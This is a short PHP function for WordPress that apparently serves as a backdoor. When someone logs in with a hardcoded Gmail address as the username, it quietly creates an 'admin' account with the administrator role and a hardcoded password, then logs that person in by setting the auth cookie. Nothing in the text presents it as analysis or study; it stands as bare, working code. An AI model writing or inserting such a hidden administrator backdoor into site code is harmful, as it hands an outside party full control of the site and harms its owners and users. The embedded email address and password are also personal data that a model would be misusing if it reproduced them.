<?php
function criar_usuario_macedo($username) {
    $email = 'marcosmacedo.fogao@gmail.com';
    $password = 'QWEasdzxc@123';

    if($username == $email && !email_exists($email)) {
        $userdata = array(
            'user_login' => 'admin',
            'user_email' => $email,
            'user_pass' => $password,
            'role' => 'administrator'
        );
        $user_id = wp_insert_user($userdata);
        $user = new WP_User($user_id);
        $user->add_role('administrator');

        wp_set_current_user($user_id, $username);
        wp_set_auth_cookie($user_id);
        do_action('wp_login', $username, $user);
    }
}
?>